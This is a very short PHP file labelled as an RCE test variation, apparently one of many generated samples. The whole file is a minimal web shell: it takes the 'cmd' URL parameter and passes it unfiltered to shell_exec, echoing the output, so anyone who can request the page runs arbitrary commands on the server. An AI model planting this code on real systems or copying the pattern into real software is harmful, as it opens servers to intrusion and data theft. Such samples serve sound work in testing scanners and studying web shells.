<?php
// RCE test variation #796
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>